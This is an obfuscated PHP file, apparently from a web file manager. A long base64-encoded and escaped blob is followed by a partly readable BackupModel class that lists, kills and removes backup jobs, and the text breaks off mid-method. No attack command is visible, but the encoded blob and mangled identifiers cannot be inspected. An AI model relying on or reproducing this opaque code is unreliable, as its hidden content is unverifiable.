6\xe7\x12\xe\x1b\x86\x25\x39\xad\x4c\x9b\xf9\x8c\x21\x39\x2f\xd0\x98\x66\x79\xaa\x98\xee\xe7\x3e\x0\xf0"."\111\141\373\7\15\6\175\307\160\66\21\264\243\124\55\115\331\146\111\63\160\271\37\163\115\176\55\333\143\42\102\257\67\307\122\265\176\127\276\360\27\133\60\263\6\363\143\267".base64_decode('3I8+IeXRwqhxdt5irQfuQBZHbB6TtyQ5kbgSDz73mj3YgCdyR7cJMohaZTJ4g25C').base64_decode('FLhknMn88QoKDVN1xAEyjfoU4UeeiVUpr3KUZ4MS7zSCbE/LDgwYIs/1C3WxXD9X').base64_decode('7Ei7CBlMM4iYJdEq4NId5dUPM9UsMPCsH45LL1K4nEfITvBDCxOT/c0toQY/Oo4m')."\62\5\174\104\4\164\46\21\25\300\0\113\33\264\47\63\306\207\246\214\237\252\364\242\225\0\210\51\165\53\173\214\333\305\62\115\244\176\122\323\226\236\301\352\57\214\352\244"."\251\36\110\242\211\2\257\320\70\365\277\7\40\210\166\22\357\60\36\6\15\225\373\356\242\262\337\135\124\356\273\213\74\337\135\124\372\135\232\344\201\130\255\120\150\350\305\260".base64_decode('4MK+rqS0HGGnYDdW75GVhEACS3WEAyi7kRLgGV7eFiG+K7ql/eJqLgBHBFQPYuUD')._kodDe('K78NqV2zppjYGtsNUGJWIA/Mj2fTw2Hgp2kTO/Bum/+hPgouo+oZm4uFOf8X4vPPZg==').base64_decode('My/32yuc+9KrARoOc48ziEkJ9WAnIwjPwayEhwqmrcu+ojM6cUXKreolF8w5bQhj').base64_decode('IpvFhDNm5tpY9gOJJ8yfczmPH/KjoXvcGdu63s80GSWGhQsl2ribYu9wMCoQSNHi')."\x8e\xa9\xe9\xad\xb2\xbf\x6c\x82\x5f\xf2\x4e\x41\xb1\x81\xe4\xe6\x1c\xf5\xb\x9a\xc6\xdd\x84\xfd\xdb\x4b\xe6\x6\xc6\x9c\xa6\x3f\x4b\xca\x8d\xda\x6f\x9\xbf\xd1\x68\x2d\xe9\xe3\x4\xf3\xf4\x61"."\xe6\x93\xd9\xb3\x3\x3c\x6e\x9c\x3b\xe7\x76\xb6\x74\x26\xe5\x69\x72\x2c\xad\xbb\x1b\x75\x5b\xf2\xc\xeb\xea\x8b\xf0\x1a\xd\xe0\x47\xde\x13\x60\x93\x31\xba\xcf\x69\xb8\x3c\x39\xb6\xac\xcb\x6a"."\310\44\34\112\320\42\212\165\276\101\116\36\6\311\303\44\145\140\167\76\116\7\350\355\26\332\170\205\242\364\66\216\14\57\370\330\147\123\112\44\33\324\323\67\103\31\304\3"."\67\170\370\257\143\43\102\123\227\257\67\231\1\321\212\12\4\211\25\265\25\307\124\241\337\352\12\137\5\46\154\111\34\257\42\116\40\375\250\250\75\246\212\4\252\301\135\314"."\10\130\147\110\116\160\305\215\75\10\343\346\240\251\225\256\231\346\220\331\300\173\177\142\160\142\160\20\360\301\234\345\370\213\342\231\16\357\31\60\244\42\264\307\256\117\124\31"."\371\2\132\207\131\227\163\232\171\117\30\132\156\151\204\346\27\371\103\55\113\374\302\55\365\254\71\103\271\254\2\134\151\135\345\204\100\115\245\302\236\161\251\253\154\117\66\371".strrev(''."\r".' \\¨a££ÌÄm9'."\0".'º´lwA#Åíáf….0XT&eŒk|ôvt¹Vf=™ÎW§')."\223\331\316\261\230\360\24\236\327\235\101\323\202\33\165\100\260\23\153\46\313\60\15\40\302\214\10\251\200\252\26\313\121\331\360\333\13\303\305\274\37\213\54\374\11\331\43\240"."\xe7\x6d\x82\x1a\x77\x79\x2c\x74\x70\x97\x97\x51\x63\x5a\xa0\x8f\x9c\x8\xd2\x77\x26\x6a\x15\xf9\xf1\x11\xc9\xf\x33\x11\x68\xd1\x5d\xc9\x94\x43\x20\xd\x63\x4d\x96\x64\xb8\x15\x54\x69\x10\xa3".base64_decode('RNWNEo/z9BdPtR8RXRj+0aZCx6+jlyvifuHC++6FdxZIFby4fvlBjSFEoeNs7Frf').base64_decode('j9fXb2RGyxGbumxX0wAq5Yq0F42M95NEicFfLLIPlm1U5h9YATKICG/PRZlraK05')."\61\356\45\356\5\215\242\225\272\253\107\233\127\231\70\251\166\312\14\364\227\246\34\313\164\60\212\5\246\145\215\202\314\235\375\121\301\156\206\7\304\223\27\154\154\170\301\45".strrev('³<’{Œ¢'."\0".'o1˜2‡5ü©&k	;§i"é}ùJLzëz\'*â3‡|1d®ÿÿ')."\xf2\x5\xe9\x61\x1\x8b\x97\xd7\xc4\x16\x49\x65\xfb\xc5\x48\x52\x58\xa1\x1c\x20\xbc\x1f\x75\xd4\x14\x64\x16\x39\x72\x65\x31\x76\x6f\x31\xdf\x5f\x27\x65\x2a\x8e\x69\x2a\x39\x2d\x3f\xc\xdc\xc0"."\130\273\166\254\75\23\177\250\16\253\322\333\50\102\63\204\27\137\174\216\10\227\206\324\41\17\344\320\173\205\0\176\204\45\200\17\251\170\221\231\200\21\301\37\15\267\145\213"."\xfc\xc9\x8c\x2\x9\x43\x6f\xdb\xa2\xed\x73\x23\xad\x92\x32\x95\x94\xa0\x36\x34\xb6\xaa\xa1\xb6\xb6\xb2\x19\xf2\x37\x82\x58\x13\x21\xd0\x7\xd3\x81\x5f\xdf\xa2\xa1\x59\x46\xae\x47\x49\x63\xdb".strrev('ôÂ™d…p¼O›1 ¬ör»4BOÆ@ÒŠ¸•*€Ë5/%N®5ùšVØ¡Zœ'."\n".'ºŒ')."\44\20\74\32\163\126\101\254\256\224\77\26\257\264\254\75\101\122\233\204\343\43\105\231\245\51\164\116\353\52\211\14\275\122\351\105\147\63\327\325\234\355\255\334\312\256\260\146"."\5\65\71\23\357\262\270\311\110\141\316\120\15\160\247\177\145\257\101\102\222\27\164\362\30\106\203\226\137\120\132\5\67\36\110\313\131\164\45\211\161\114\151\371\40\221\42\4"."\x5\xef\xe8\xbe\x27\xe2\xd7\x2a\x65\x80\xa2\xa0\xa5\xfb\x31\x4c\x89\x3\x0\xbe\x4\x19\x6d\x98\x49\xa1\x19\xae\x37\x1d\x1c\x49\x49\xa4\x88\xcd\xc3\x88\x58\xde\x12\xf\xcf\xac\x58\x41\x1b\xc2"."\147\376\252\125\245\151\240\147\352\315\12\25\14\157\22\206\27\157\32\146\272\105\32\72\311\334\237\241\260\52\27\22\51\254\14\375\25\165\242\255\163\105\204\62\45\256\314\16"."\xa6\xd2\x4d\x62\x9d\x1d\x95\x81\x71\xab\x56\x5\xd\xa6\x8d\xc5\x34\x47\x58\xdd\x0\x2f\x4d\xe3\x9d\x1\x77\x79\x34\x12\x98\x7a\x5e\x10\x12\xbc\x25\x29\x5\x79\x3c\x6c\xb9\x31\xc1\x71\xc2\xa4".base64_decode('jWtdKVgVq65udge/dOpieYwMNCZMZ4s+0utPLuTBhlZB6HLQplgkQAQmIbdb4TkD')."\374\111\25\31\357\320\160\250\120\220\243\101\26\301\67\22\131\43\25\344\173\234\336\122\4\322\302\22\214\25\41\30\306\223\216\125\246\74\31\330\141\67\111\36\100\350\20\321".base64_decode('XX3edNQWT+SBWXbaMgqOCzvRVxQryJM3fdqARotUKMCh11UQl/8VCBvRHEADoiuz')."\x30\xda\x51\x2c\x3d\x5b\x57\x41\xba\x6b\xf7\xea\x3a\xaa\x4f\x10\x4b\xb9\x8f\xa0\x8a\x15\xa\xc3\x89\x39\x8d\xcf\x98\xe5\x98\xe8\xe8\xe3\x96\x46\xf0\x0\x55\x7b\x1c\x8c\x31\x42\xad\x70\xb\x74"."\364\122\372\173\314\321\14\102\310\63\150\131\335\242\252\346\4\311\220\373\307\156\41\316\202\207\260\332\342\261\144\254\201\275\33\124\116\356\65\231\221\256\66\265\236\23\54\16"."\x33\x18\xe2\x1a\x19\xac\x4\x27\x6\x82\x90\x2\xeb\x6e\x15\xf3\x79\xae\xdc\x86\xa9\x43\x7e\x62\x61\x65\x19\xf5\xf8\x44\xac\x95\xbd\xb3\x92\xe4\x60\x83\x7d\xaa\x7\x94\xe\x8d\xdd\x57\x81\x56"."\54\275\200\113\364\26\35\161\72\342\307\3\222\330\164\330\206\144\311\133\41\366\225\210\32\352\240\142\312\272\32\146\27\302\164\346\204\31\31\224\54\323\6\25\31\47\271\116".strrev('XgæĞs¸¢Âài%©©© üó-\\mÌÕZeı3_Æ¦¦±8às&³·è?Iwš')."\13\12\14\352\72\164\10\16\202\234\221\57\62\202\252\243\1\233\207\51\270\153\60\144\241\123\207\326\203\370\125\144\10\144\246\304\6\316\124\310\305\44\304\164\357\44\360\33"."\137\130\141\331\351\66\13\43\272\6\255\66\231\24\350\57\267\75\104\305\4\34\315\244\246\236\165\274\123\341\174\246\103\376\130\200\115\56\115\24\216\242\375\54\303\57\277\74".strrev('·•´p~å–$|æÉÍò£‰BrM"`–’A8œ|Ó˜:'."\n".'qÜuC]\\<® Ñè•').base64_decode('RB84oc8FwByWAddec1AVpzCOHs9jZEoxu8TAMCMZWeJ5ZfhYKs4lTEItAbQsiLF9')."\277\221\165\231\30\253\122\125\171\156\147\342\202\154\44\111\167\115\334\20\332\321\41\376\314\13\325\172\144\175\123\140\353\321\50\161\33\115\136\350\243\212\252\265\143\112\26\327"."\361\56\54\131\43\313\24\366\302\45\272\106\54\46\255\24\223\226\47\176\102\35\210\245\204\131\2\325\244\151\340\336\32\245\6\274\131\236\72\41\52\144\57\251\0\351\245\245"."\311\305\104\231\322\70\335\123\232\370\151\154\340\356\147\145\347\215\124\313\100\322\154\261\301\175\276\120\53\140\155\14\110\234\124\240\140\231\75\150\325\155\171\322\120\172\133\371"."\x64\x5e\xbc\xb4\x64\x99\x42\xbc\xf7\x72\x39\x39\x11\xdf\x7a\xb0\x77\x32\x1\x9c\x85\xcd\xb2\x26\x9e\xe9\x95\x8a\x8a\xc7\x3c\xa4\x44\xf7\x6e\x96\x32\x1a\xf8\x6b\x4c\x72\x22\xe6\xcc\x64\x45\x12"."\xa2\xfe\xeb\x6e\x3\xb3\x7c\xee\x14\xde\xb3\x1f\x1\x3a\xc6\xaa\x3b\xf0\xa6\xaa\xac\xfc\x48\x8b\x9\x8c\x84\xc5\x28\xb2\xb0\x57\x75\x81\x9\x83\x55\xa6\xb7\x82\x67\x48\xdc\x23\xbb\xd3\x69\x1a"."\145\246\135\127\111\111\202\350\262\72\173\342\225\246\322\115\205\33\40\372\75\236\111\25\33\1\266\156\135\235\134\315\235\367\366\251\147\261\300\71\254\24\236\126\56\13\224\205"."\344\170\112\125\131\316\201\167\164\63\177\131\264\14\40\272\201\255\4\252\10\175\200\33\200\336\240\335\54\305\160\353\200\310\174\210\311\263\251\110\316\207\223\25\372\334\246\222".strrev('±ñ@!½–7× ‰±”çtË:AÚûÈŒ.y¨ ÷jÛ„®Uúì)è‰’&ğ'."\n".'åQ{¸¥¹×').base64_decode('uCQOwrA70LC6EFEPjQoE30GxMWsTdxlCGbY+y4s6o9Slc0KRGgG0ney1TIdzcTgf')."\301\241\210\104\145\162\55\111\253\370\147\213\357\270\356\20\45\377\331\274\50\72\327\331\327\65\166\326\23\5\64\342\177\134\142\54\75\121\257\272\36\71\227\35\166\264\62\207".base64_decode('5EKTDS9jQtJvKvMFqMSrAMFg6WnTInIFyaFE3onrPXI0anJ5Cr6z0ss0gX34SNsc')."\103\75\342\364\213\262\107\40\311\157\71\212\111\16\352\45\302\317\77\101\341\24\243\112\133\246\221\361\122\6\51\137\216\170\364\110\370\44\353\21\42\310\110\24\123\374\242\305"."\x43\xd2\x31\x83\x14\x45\xa6\x98\x98\x85\x9\x6e\x80\x38\x67\xc1\x23\xb0\xe5\x3c\xd4\x2c\xf6\x1f\x2c\x46\x26\x57\x21\xdf\x2c\xa9\x42\xf3\x30\xd1\x22\x5c\x9c\xc8\x39\x36\xf6\x3c\xdf\xce\x96\xad"."\x5c\x4e\x99\x4f\x91\x2c\x69\x46\xd3\xdc\xe9\x13\xcc\x8e\x98\x24\xc8\x18\xd6\x99\x4a\xa7\x7f\xc2\x44\xff\x24\x90\xe3\xcb\xd6\x2a\x8c\x6b\xa0\x31\xcc\xba\x48\x60\x80\x19\x2c\x86\x36\x40\x21\x12"."\xca\x89\x32\xa6\x74\x5d\x45\xdc\x9e\x8\x67\xf\xc4\xc3\xb\x5f\x4f\xe2\xa\x86\xc7\x2c\xe9\xec\xd6\xb9\xb2\x24\xf1\x89\x22\xa3\x51\xa1\x55\x40\x75\x28\x71\x81\xf6\x72\xf9\x74\x86\x70\x76\xa3"."\113\353\325\123\0\355\14\167\76\270\240\27\235\241\156\131\114\227\256\222\247\21\170\350\100\166\262\117\152\211\161\10\325\137\224\144\122\107\367\322\304\10\355\10\352\55\206\351".base64_decode('MHO8JJKTJk8s1bDAUAlNUjteeJy0qhrb8brkWC3D3NoS60vhQ5HrutpyhOVy4LRd')."\21\252\37\346\252\315\223\170\251\101\235\231\344\62\171\113\133\163\133\220\47\325\363\355\111\131\165\341\244\252\201\51\141\351\103\172\32\332\312\31\151\45\32\233\33\151\10\105"."\x1b\x23\x89\x79\x4a\x8f\xee\x28\x42\x15\x84\x3c\x54\xe1\xde\xca\x44\xa8\x48\x27\x9e\x41\x75\x8a\xbf\x99\x80\x83\xfe\x14\xa2\xd0\xfd\x19\xce\xc5\xd8\x82\x5f\x91\xb4\xe4\xa4\xe7\xa6\xdc\xcd\x52"."\xf8\xd3\xad\x92\x16\xf3\xd8\xd2\x26\x5b\x52\x7\x8b\x4a\xcb\x94\xce\xa\x19\xa2\x54\xb8\x60\xe9\xa5\xe5\x87\x75\xac\xe\x25\xf5\x58\xaa\x50\x2c\xd3\x1b\x28\x5f\xfe\xb\xe4\x61\xb\xb9\x34\x22"."\74\364\374\150\235\67\362\3\206\155\210\215\317\152\14\313\255\207\32\133\42\255\152\50\32\215\55\164\151\23\12\41\261\305\237\21\311\310\257\216\110\53\43\26\201\176\275\324".base64_decode('dxp4npIdvHvEFnT5ZH96BXb9AS878kcIaFR6FKhgaYatSwn0MZtxYNiiZbOu9wqz')."\xdd\x52\xb4\xe8\x3e\x59\xcb\x7e\x4a\xa5\x1f\x60\x69\x92\xcb\xbe\x72\x5\xe2\xf8\x21\xfa\xff\x75\x57\x8d\x8c\x70\x97\x65\x64\x98\x16\x6\xb7\x43\xa4\xef\x13\x34\xc8\x6f\x5b\xb2\x6f\x96\x3c\x7c"."\xf4\x93\x4f\x28\xf9\xc4\x85\x91\x4a\x1c\xa\xb1\x97\xdc\x4c\xc2\x7e\x0\x6d\x4c\xd3\x22\x31\x95\xbe\x20\x28\x3e\x81\x18\x63\x6b\xb8\x20\xdf\xd8\x5\x33\xec\x15\x19\x46\x5c\x62\xaf\x80\x61\x76"."\x4d\x84\x23\x82\x11\xc0\xc5\xa1\x35\xfc\x39\xca\x1e\x22\xae\x17\xb\xb9\x18\xcb\xc0\xb4\x43\x11\x9e\x80\x79\x76\xdd\x58\x7b\x1e\x83\xf2\x2a\xd2\xba\x9e\x87\x2f\xf9\x6\x79\x89\x80\xe6\x75\xe0".base64_decode('4aCSXWJwKMZfGhFVvTllOoCyFSFD4gWUOqWGvkvGX5FQZjGravEB4scrnCs4Lta5')."\131\326\230\227\326\206\46\20\112\107\260\106\130\227\310\314\15\227\44\270\4\107\121\326\57\256\174\210\337\320\310\167\233\362\374\21\204\214\315\37\350\353\202\224\107\367\41\336".base64_decode('RndKnyKi1f9PKtLMhKSS6W6ktEO296gTZBd+ZanXHHQ/MYhTvO8quV5UkjYNMf6V')."\xdf\x80\x72\x57\xf2\x95\xbc\x65\xa2\x90\xc7\x6d\x15\x4\xea\xb0\x8a\xd8\x63\x94\x2d\x6f\x53\xe9\xd3\x63\xe9\x4f\x27\xfc\xb2\xe3\xcc\xdb\x9\x8a\xa8\xe0\x93\xd5\x1c\xa8\x1a\x7a\x8d\x6c\xc6\xe2".base64_decode('yjEioUUXjDmphfVDNPaIL3lwDYbLn08p99gW9snnfgVGPK4jzk73YyP8itcWm8F2')."\x5c\xcf\xdb\x24\xcd\xa4\xd6\xe3\xa3\x14\x19\xc6\x6a\x22\x56\x3f\x2c\x87\x65\x85\x58\x32\xa\x94\x9\x13\x69\x64\xf8\x7a\xcf\x96\xa\xb0\x17\xeb\x32\x3e\xf2\xb6\x1a\x45\x75\xde\xf7\x59\xa4\x9d"."\xc6\xf1\xa7\x5c\xbb\x27\x6b\xa6\xb4\x6c\x9c\xea\x94\xb9\x8c\x65\x2c\xc4\x4d\x71\x3d\x51\x57\x31\x9a\x14\xd4\xa\x5\x71\x1\x25\x1f\x99\xe8\x5f\x97\x91\x22\xe4\xb5\x27\x9b\x55\x62\x6a\xaf\xd2".base64_decode('e+qEgDnp6oomwjVWMR+hUn9XqiXxebIyM72wE2ZxUBz1s43e0MGEyU2yW1Mugm6S').strrev('•àƒ·¥RGıÂd)‚:õôÃQ	AŒ®³('."\n".'Fds\\)2²(À9mb²Ş–{').base64_decode('vHJPAVHIJz+NejdnanBcHO6yuxChbuF9wK70MT728B7bOvDqXpmn9EZ9ic8nLCB/')."\xec\x85\x21\x61\xa7\xe7\x7e\x1b\x1a\x8f\x83\x93\x6\x9c\x6f\x28\x61\x3d\xbc\x5c\x7\x9f\x56\x4f\x85\xb8\x77\x92\x93\x66\xa9\x3c\x56\xdc\x43\xbb\xde\x9\x94\x46\xd\xa8\xad\xf4\xad\x41\x69\x1a"."\244\161\27\255\254\217\134\311\373\230\273\275\262\317\25\272\336\73\362\56\150\231\7\17\177\262\101\120\345\45\114\127\306\215\365\152\147\245\54\166\307\351\55\146\270\140\127\265"."\164\141\337\103\335\231\226\34\20\213\163\231\211\223\246\314\220\205\33\142\11\305\205\340\44\372\3\27\230\100\255\10\240\120\134\323\340\123\230\17\125\171\367\223\114\267\226\165"."\351\163\230\236\23\340\177\267\141\4\367\100\213\112\72\317\245\317\12\227\314\0\201\123\111\33\110\72\20\75\352\36\46\326\307\260\305\256\243\107\240\170\21\323\375\55\112\76".strrev('ÇE¹+–ÈŠi‰“¾Şë™o Í&0LÈ›ã–PÍÍ,w+,9Øóf†‹èY´¬ø‡”')."\xf4\x8a\x82\x70\x75\x7c\x2e\x12\x49\x64\x2c\x9f\x85\x63\x1b\xdb\x7c\x8b\xdd\x26\x61\xa2\xff\xc5\x2\x32\x1e\x89\xb2\x53\x42\xd9\xa7\xcc\xc8\x83\xc7\x31\xd4\x52\xe6\xc5\x4a\x49\x77\xe2\x47\xfa"."\x4d\xa9\x3b\xce\xf\xfa\x35\xc7\x2f\x1\xa4\x24\x3e\xd4\x9d\x18\x59\x60\x40\x11\x82\x6d\x75\x8f\xd5\xd3\x3c\xaa\x26\xda\xe8\xf2\x29\xa3\x15\x2a\x25\xf1\xa4\x87\x2d\x85\x57\x30\x89\xb8\xc3\xb5"."\231\41\350\50\134\77\303\124\362\223\235\116\257\140\137\350\16\165\355\126\311\63\261\154\35\107\32\222\267\101\151\323\322\273\205\102\20\104\44\107\60\10\330\303\304\331\51\261"."\x90\xc\xcd\xe5\x56\x93\x9a\xa4\xa0\xe5\x96\x4e\xe1\xd9\x95\xde\xa4\x35\xe5\xb0\x98\x75\x8c\xe9\x63\xcc\xdf\x2b\xfa\xba\x8b\xbb\x44\xf1\x46\xcf\x13\xc5\x4\x2b\x79\xdf\x2d\x66\x53\x44\x50\x81"."\300\162\222\361\255\213\225\341\57\271\271\130\33\333\373\174\43\42\360\144\237\315\50\352\175\376\26\320\41\321\212\247\137\223\16\124\326\251\36\51\324\132\314\211\210\44\322\45"."\x5c\x14\xcf\x74\xd9\x28\x63\xef\x56\x9e\x9d\xcf\x2c\x9f\x6d\xcf\xb3\xae\xd4\x9b\x2e\xd\x33\x62\xff\xff\xfa\xe5\xc2\xff\x57\xf\x16\x4e\xa9\x61\xc2\x77\xd7\xab\xc7\x73\x81\xe4\x86\xde\xe2\x1b".strrev('ËH\'óõğd÷’”™å­+6ZNcLøæ3‡™UÎ)oMüE'."\0".'îæ‡Ü8Ï_‚ ‚.E')."\105\274\46\166\336\267\145\73\330\273\353\344\331\330\256\162\5\5\346\341\274\120\31\70\246\111\214\4\316\227\336\17\343\365\212\272\375\135\113\104\106\111\61\361\125\104\213\60"."\x67\x71\x41\x16\x4a\x63\xb6\x8f\x78\x70\x80\xf9\x92\x6d\x71\x63\x5\xc6\x20\x56\x3\x66\xef\x82\x5f\xb0\xec\x7\xac\x24\x63\x22\x57\x52\x9\xfe\x4a\xba\x56\xc1\x95\x28\x4f\x30\xac\x1a\x36\x65"."\146\13\350\252\321\342\171\33\223\26\262\345\331\164\211\350\113\325\5\112\153\363\235\57\127\301\72\326\156\251\25\177\341\274\306\373\344\371\4\177\351\307\250\211\3\26\234\304".base64_decode('saiCCZ/ILQ65Pi1Th0JqQpQZZa+U37H8TVIhicMhebxs57dZJiHo3KlcfCMpt0qP').strrev('‰ˆİ‰Lp”÷‡=/kÉ¡ö"Ä'."\0".'ëXŠ¥½µV{Ó‰0ĞšâjñVç«–=È'."\r".'t')."\x21\xec\x73\x97\x1\x9d\xa4\x7f\xe\x49\x2e\xb9\x9e\x2d\xbf\x2f\xe2\xae\x89\x2d\xa\xdc\x7b\x69\x76\xb9\x62\x69\xd3\xb2\xa5\x62\x3c\xbd\x5c\x59\xc\x61\xb2\xdc\x42\xce\xc3\xf\x16\x3b\xae\xb5"."\x10\xef\x17\x78\xdf\x2d\x20\xdc\x3c\x65\xd0\x5d\x7c\x3a\xdc\xe4\xca\x49\xd2\x45\x27\x22\xb6\x33\xee\x87\x50\x48\x26\x49\x66\x3e\x4c\xa1\x5\xe9\xaa\xce\x7d\x53\xca\xbd\xb5\x97\x60\xca\xa2\x11"."\225\262\111\55\346\32\17\375\142\43\303\210\360\174\101\262\351\45\104\110\172\25\333\133\313\375\200\272\164\257\232\46\220\27\56\275\72\23\67\172\22\235\301\252\141\116\110\34"."\1\236\364\162\357\201\167\153\3\202\110\22\264\170\46\323\244\15\224\51\232\141\334\10\117\105\51\274\50\41\262\44\273\145\241\2\257\17\172\237\105\16\310\266\316\256\202\245"."\xa9\xc2\xae\x59\xaa\x2f\x2e\x51\xc4\x30\x71\x5a\xb9\xe1\x93\x8d\xe6\xae\x2e\xdb\x4d\x73\xa0\x12\x49\xf4\x29\xb\xae\x75\x25\xf1\x3d\xd8\xac\x43\xa8\x63\xd1\xa1\x70\xf6\x5e\x7c\xd2\x6d\xa5\xcd"."\213\361\65\103\145\210\21\215\337\225\352\341\344\260\44\205\121\14\236\54\133\176\322\330\175\135\52\313\33\44\20\320\263\121\251\71\371\52\165\324\12\211\362\37\21\120\351\236"."\x62\xc9\xbc\x5d\x64\xb0\xa3\x4e\x6e\xc5\x85\x22\xf9\xc0\xa0\x64\x5c\xce\x74\x75\xc7\xbb\xb4\x84\x9\x11\xe0\x4b\x13\x73\x44\x8c\x4b\xf3\x42\xee\x2c\x5a\x5e\xf7\xf4\x5e\xae\xe0\x1d\x19\xad\x61"."\17\32\116\272\127\342\214\112\63\113\323\255\222\111\205\17\225\357\257\267\127\154\116\275\374\242\150\244\244\77\222\76\106\322\54\123\207\366\250\154\65\232\205\153\12\162\325\125"."\167\224\51\300\165\151\26\256\133\222\315\52\113\342\25\251\236\243\25\355\121\206\127\72\171\40\163\310\224\31\260\207\63\247\105\107\233\317\262\205\113\77\7\20\347\55\115\204"."\x14\xe5\x7b\x21\x64\xb\x9e\x7b\xf1\x72\xbd\x28\x5b\x78\xd4\x5e\x88\xd2\x9e\x53\xa0\x1c\xae\x65\x39\x65\xb0\xab\x50\x90\x28\xc5\xe3\x22\xaf\x8c\xba\x6\x6d\x13\x9f\xd1\xb2\x6b\xac\x32\xd9\xb2"."\356\107\171\355\220\170\331\255\157\273\325\66\74\351\362\304\200\147\125\32\141\372\134\210\123\314\32\375\102\223\215\151\241\217\165\341\367\142\276\77\157\362\63\43\43\264\14\261"."\206\164\310\362\116\144\111\153\156\70\315\27\45\147\265\145\225\342\175\230\257\57\345\240\263\32\223\374\113\326\4\224\345\61\35\43\255\273\75\342\312\36\262\150\76\373\110\126"."\x92\xd\x7a\xc4\x72\x42\xca\xe0\x52\x2b\x28\x23\xb8\x22\x49\x34\x18\x10\x12\x72\xda\x9e\x18\x8b\x4\x13\x2e\x2b\xe\x4a\x27\xc0\xc5\x2\xbd\x93\x6c\xc0\x77\xdf\xfc\x36\x8a\x78\x73\xa5\xe7\x2a"."\315\116\230\226\343\303\171\111\263\100\176\353\115\307\21\167\364\224\255\47\304\40\76\34\175\222\12\12\12\211\253\47\334\51\162\247\101\300\226\240\27\22\204\333\121\314\57\47".base64_decode('dJpLkJIrgu9KeEQ+++CWtKnouccVCYg5TZlDzFcmNgwX/RG3KWTKBH0C4Ccr0RCT')."\x7b\x3b\x48\x73\x82\xf0\xc6\x82\x5f\xc3\x84\x22\x3c\xaf\x16\xe8\x2b\xf4\xb8\xaa\xd3\x47\xaa\xb8\x72\xe9\x8f\xb5\x0\x52\x54\xd1\x4\x75\xb0\x4e\x64\x5d\x60\x6e\x93\x48\x26\x4a\xb2\xda\x42\x89"."\304\302\130\274\221\372\143\57\311\46\265\44\245\244\222\254\266\346\130\353\150\171\341\226\120\44\132\222\207\365\227\132\125\341\324\214\146\105\332\110\57\311\45\340\150\275\210\64"."\314\23\75\41\327\315\102\70\137\350\65\231\314\235\135\136\44\264\54\343\322\45\333\121\75\47\274\331\211\72\171\43\335\57\204\173\232\104\274\333\314\355\44\17\270\37\67\362"."\xa8\x9\x32\x20\x85\x86\xb0\xee\x51\x2b\xb4\x1d\x2f\x40\x2a\xf6\x4f\xcf\xf7\x3a\x27\xa4\xc5\xfd\x79\xc0\x75\xcf\x2e\xa5\x93\xfd\x40\x10\x8c\x4\x73\xf2\x41\x4b\x12\xc6\x95\x9d\x20\x59\xb0\x5b".base64_decode('etFAcsUE4I4dz15c7TNT0kUCZWPAkhOmVNIvo2FXtqP1lL1uptI8vOOFnO1/AIfa').strrev(''."\0".''."\0".'«×vï'), 10, -8))); goto e˜Ë›Ö¬”„; b“…óî®ŒÜ: class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\56\142\x61\143\153\165\x70\x4c\151\x73\164"; public $field = array("\151\x6f", "\x6e\x61\155\x65", "\163\164\x61\x74\x75\163", "\143\x6f\x6e\x74\x65\x6e\164", "\x6d\141\156\x75\x61\154", "\162\x65\x73\165\x6c\x74", "\x74\x69\155\x65\x46\x72\157\x6d", "\164\151\155\145\124\x6f"); public function config() { $Ñà±’üü =& $_SERVER[Ó¡Ÿ§‚]; $ê”üÔë = Model($Ñà±’üü[769])->get($Ñà±’üü[779]); $ê”üÔë = json_decode($ê”üÔë, !0); $ê”üÔë = is_array($ê”üÔë) ? $ê”üÔë : array(); if (!isset($ê”üÔë[$Ñà±’üü[753]])) { $ê”üÔë[$Ñà±’üü[753]] = $Ñà±’üü[88]; } unset($ê”üÔë[$Ñà±’üü[1635]]); Action($Ñà±’üü[1879])->taskInit(); Model($Ñà±’üü[1634])->cacheClear(); $úáÄåÆ = $Ñà±’üü[1880]; $Ş«‡º†ğ = Model($Ñà±’üü[1881])->findByKey($Ñà±’üü[1653], $úáÄåÆ); if (!$Ş«‡º†ğ) { $Ş«‡º†ğ = array(); } if (isset($Ş«‡º†ğ[$Ñà±’üü[180]])) { $Ş«‡º†ğ[$Ñà±’üü[180]] = json_decode($Ş«‡º†ğ[$Ñà±’üü[180]], !0); } if (isset($ê”üÔë[$Ñà±’üü[180]])) { $Ş«‡º†ğ[$Ñà±’üü[180]][$Ñà±’üü[1638]] = $ê”üÔë[$Ñà±’üü[180]]; unset($ê”üÔë[$Ñà±’üü[180]]); } return array_merge($Ş«‡º†ğ, $ê”üÔë); } public function listData($‹·è€ÀÕ = false, $¨á¥ç™ê = "\155\157\144\x69\x66\171\x54\151\155\x65", $Àø¶¹‘µ = false) { return parent::listData($‹·è€ÀÕ, $¨á¥ç™ê, !0); } public function lastItem() { $×Ş­•½ã = $this->listData(); return !empty($×Ş­•½ã[0]) ? $×Ş­•½ã[0] : null; } public function kill($óİ¸î•Î) { $õ‰×ØŠè =& $_SERVER[Ó¡Ÿ§‚]; $óÅóıÈü = $this->listData($óİ¸î•Î); if (!$óÅóıÈü || empty($óÅóıÈü[$õ‰×ØŠè[32]])) { return !0; } Task::kill($õ‰×ØŠè[778]); Task::kill($õ‰×ØŠè[799]); Task::kill($õ‰×ØŠè[808]); $Õ©ÔÕ•  = $óÅóıÈü[$õ‰×ØŠè[32]]; $®‡®ƒÁ = TEMP_FILES . $õ‰×ØŠè[777] . $Õ©ÔÕ•  . $õ‰×ØŠè[8]; IO::remove($®‡®ƒÁ, !1); return $this->remove($óİ¸î•Î); } public function remove($ÓÉ²Œ¼) { $­»˜êñ„ = $this->listData($ÓÉ²Œ¼); if (!$­»˜êñ„) { return !0; } return $this->backupRemove($­»˜êñ„); } private function backupRemove($‘¶Çùø×) { parent::remove($‘¶Çùø×[$_SERVER[Ó¡Ÿ§‚][399]]); $‰™Åß© = $this->backupPath($‘¶Çùø×); IO::remove($‰™Åß©, !1); return !0; } private function backupPath($’ÊƒãñÅ) { $«ŠÕ«ç =& $_SERVER[Ó¡Ÿ§‚]; $™´±—³ = $’ÊƒãñÅ[$«ŠÕ«ç[32]]; $çÇ¸çı = Model($«ŠÕ«ç[769])->get($«ŠÕ«ç[770]); $ìßıĞÙ = substr(md5($«ŠÕ«ç[771] . $çÇ¸çı . $™´±—³), 0, 8); return "\x7b\151\x6f\72{$’ÊƒãñÅ[$«ŠÕ«ç[750]]}\x7d\57\x64\x61\164\141\142\x61\163\x65\x2f\x62\141\x63\x6b\165\160\57" . $™´±—³ . $«ŠÕ«ç[11] . $ìßıĞÙ; } public function start() { $¶»Ö³ø =& $_SERVER[Ó¡Ÿ§‚]; if 